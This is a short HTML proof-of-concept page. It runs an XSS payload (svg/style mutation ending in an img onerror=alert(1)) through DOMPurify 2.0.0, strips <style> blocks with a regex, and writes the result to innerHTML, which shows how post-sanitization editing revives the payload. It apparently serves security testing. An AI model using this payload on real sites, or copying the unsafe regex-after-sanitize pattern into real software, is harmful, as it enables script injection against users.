<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.0/purify.js"></script>
<textarea id="input" style="width: 100%; height: 80px; font-family: monospace">
	<svg>
		</p>
		<style>
			<g title="
		</style><img src onerror=alert(1)>">
</textarea>
<br /><b>Actual HTML:</b>
<pre id="actual" style="white-space: pre-wrap"></pre>
<br /><b>Sanitized with Dompurify</b>
<pre id="sanitized" style="white-space: pre-wrap"></pre>
<br /><b>Replaced the style tag</b>
<pre id="injection" style="white-space: pre-wrap"></pre>
<br /><b>Output Html</b>
<pre id="outputHtml" style="white-space: pre-wrap"></pre>
<br /><b>Written via innerHTML:</b><span id="output"></span>

<script>
	const inputElement = document.getElementById("input");
	const sanitizedElement = document.getElementById("sanitized");
	const injectionX = document.getElementById("injection");
	const outputElement = document.getElementById("output");
	const outputHtml = document.getElementById("outputHtml");
	const actualElement = document.getElementById("actual");

	function sanitize() {
		inputElement.textContent = inputElement.value;
		const injection = DOMPurify.sanitize(inputElement.value);
		actualElement.textContent = injection;
		sanitizedElement.textContent = injection;
		let replaced = injection.replace(/<style>.*<\/style>/gs, "");
		injectionX.textContent = replaced;
		outputElement.innerHTML = replaced;
		outputHtml.textContent = outputElement.innerHTML;
	}

	inputElement.addEventListener("input", sanitize);
	sanitize();
</script>